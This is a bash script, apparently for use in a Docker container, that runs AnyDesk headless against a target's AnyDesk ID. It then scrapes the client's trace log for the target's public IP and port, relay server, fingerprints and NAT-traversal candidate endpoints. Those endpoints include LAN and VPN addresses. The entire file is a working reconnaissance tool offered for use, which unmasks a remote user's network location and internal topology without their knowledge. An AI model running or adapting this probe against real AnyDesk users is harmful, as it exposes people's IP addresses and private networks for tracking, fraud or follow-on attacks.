#!/bin/bash
# Author: troodon7 (https://github.com/troodon7)
# AnyDesk Recon Probe — OSINT extraction via trace log analysis
#
# Runs alongside the existing probe architecture but waits 1.5s past
# initial connection to capture P2P negotiation data (punch_connector
# candidates expose the target's full network topology).
#
# Output: single JSON line with public IP, fingerprints, relay, and all
# advertised connection endpoints (LAN IPs, VPN IPs, public IP:port).
#
# Usage: same as probe.sh — mount as volume and override entrypoint:
#   docker run --rm --network=host --security-opt apparmor=unconfined \
#     -v /path/to/recon_probe.sh:/recon_probe.sh:ro \
#     -e TARGET_ID=... -e TIMEOUT=20 \
#     --entrypoint /recon_probe.sh anydesk-probe
#
# Environment:
#   TARGET_ID  — AnyDesk ID to probe (required)
#   TIMEOUT    — max seconds to wait for online confirmation (default: 20)

set -euo pipefail

TARGET_ID="${TARGET_ID:?TARGET_ID environment variable is required}"
TIMEOUT="${TIMEOUT:-20}"

PROBE_USER="probeuser"
ANYDESK_DIR="/home/${PROBE_USER}/.anydesk"
TRACE_LOG="$ANYDESK_DIR/anydesk.trace"
DISPLAY_NUM=99

cleanup() {
    pkill -9 anydesk 2>/dev/null || true
    kill "$XVFB_PID" 2>/dev/null || true
}
trap cleanup EXIT

# --- Start virtual display ---
Xvfb ":${DISPLAY_NUM}" -screen 0 800x600x24 -ac &>/dev/null &
XVFB_PID=$!
export DISPLAY=":${DISPLAY_NUM}"
sleep 0.3

# --- Launch AnyDesk in standalone mode ---
su "$PROBE_USER" -c "DISPLAY=\":${DISPLAY_NUM}\" anydesk ${TARGET_ID}" &>/dev/null &

# Wait up to 10s for trace log to appear
INIT_WAIT=0
while [ ! -f "$TRACE_LOG" ] && [ "$INIT_WAIT" -lt 20 ]; do
    sleep 0.5
    INIT_WAIT=$((INIT_WAIT + 1))
done

if [ ! -f "$TRACE_LOG" ]; then
    echo "{\"id\":\"${TARGET_ID}\",\"status\":\"error\",\"detail\":\"AnyDesk failed to initialize (no trace log)\"}"
    exit 1
fi

# --- Phase 1: Wait for online/offline confirmation ---
START_MS=$(date +%s%N | cut -b1-13)
ELAPSED=0
CONFIRMED=0

while [ "$ELAPSED" -lt "$((TIMEOUT * 1000))" ]; do
    sleep 0.2
    LOG_CONTENT=$(cat "$TRACE_LOG" 2>/dev/null || true)

    if echo "$LOG_CONTENT" | grep -qi "Client appears to be offline\|desk not found\|connection refused"; then
        echo "{\"id\":\"${TARGET_ID}\",\"status\":\"offline\"}"
        exit 0
    fi

    if echo "$LOG_CONTENT" | grep -qi "Connect request accepted\|tunnel route created"; then
        CONFIRMED=1
        break
    fi

    NOW_MS=$(date +%s%N | cut -b1-13)
    ELAPSED=$((NOW_MS - START_MS))
done

if [ "$CONFIRMED" -eq 0 ]; then
    echo "{\"id\":\"${TARGET_ID}\",\"status\":\"unknown\",\"detail\":\"timeout\"}"
    exit 0
fi

# --- Phase 2: Wait 1.5s more for P2P negotiation (punch_connector candidates) ---
sleep 1.5
NOW_MS=$(date +%s%N | cut -b1-13)
ELAPSED_TOTAL=$((NOW_MS - START_MS))
LOG_CONTENT=$(cat "$TRACE_LOG" 2>/dev/null || true)

# Parse: target's public IP and port from "Logged in from IP:PORT on relay RELAYID"
PUBLIC_IP=$(echo "$LOG_CONTENT" | grep -oP 'Logged in from \K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(?=:[0-9]+)' | head -1 || true)
PUBLIC_PORT=$(echo "$LOG_CONTENT" | grep -oP 'Logged in from [0-9.]+:\K[0-9]+(?= on relay)' | head -1 || true)

# Parse: relay ID from "on relay RELAYID"
RELAY_ID=$(echo "$LOG_CONTENT" | grep -oP 'Logged in from .+ on relay \K[a-f0-9]+' | head -1 || true)

# Parse: relay server IP from first "relay_connector - Using IPv4: IP" line
RELAY_IP=$(echo "$LOG_CONTENT" | grep 'relay_connector.*Using IPv4' | head -1 | grep -oP 'Using IPv4: \K[0-9.]+' || true)

# Parse: short fingerprint from "(FPR: XXXX)"
FPR_SHORT=$(echo "$LOG_CONTENT" | grep -oP '\(FPR: \K[a-f0-9]+' | head -1 || true)

# Parse: full fingerprint from "Making a new connection to client HASH"
FPR_FULL=$(echo "$LOG_CONTENT" | grep -oP 'Making a new connection to client \K[a-f0-9]+' | head -1 || true)

# Parse: target's advertised P2P endpoints from punch_connector Spawning lines
# These are the target's IPs shared during NAT traversal negotiation.
# Filter out private IPs of the PROBE itself (from connection_mgr Candidate lines).
PROBE_LAN=$(echo "$LOG_CONTENT" | grep -oP 'Candidate [0-9]+ \[\K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' || true)

# Build JSON array of connection candidates
CANDIDATES_JSON="["
FIRST=1
while IFS= read -r line; do
    IP=$(echo "$line" | grep -oP 'Spawning: \K[^\]]+(?= \()' || true)
    [ -z "$IP" ] && continue
    # Skip IPv6 link-local (fe80::)
    echo "$IP" | grep -qi 'fe80' && continue
    if [ "$FIRST" -eq 0 ]; then CANDIDATES_JSON="${CANDIDATES_JSON},"; fi
    # Escape for JSON
    IP="${IP//\"/\\\"}"
    CANDIDATES_JSON="${CANDIDATES_JSON}\"${IP}\""
    FIRST=0
done < <(echo "$LOG_CONTENT" | grep 'punch_connector.*-> Spawning:')
CANDIDATES_JSON="${CANDIDATES_JSON}]"

# Build output JSON
cat <<EOF
{"id":"${TARGET_ID}","status":"online","public_ip":"${PUBLIC_IP:-}","public_port":"${PUBLIC_PORT:-}","relay_id":"${RELAY_ID:-}","relay_ip":"${RELAY_IP:-}","fpr_short":"${FPR_SHORT:-}","fpr_full":"${FPR_FULL:-}","connection_candidates":${CANDIDATES_JSON},"elapsed_ms":${ELAPSED_TOTAL}}
EOF
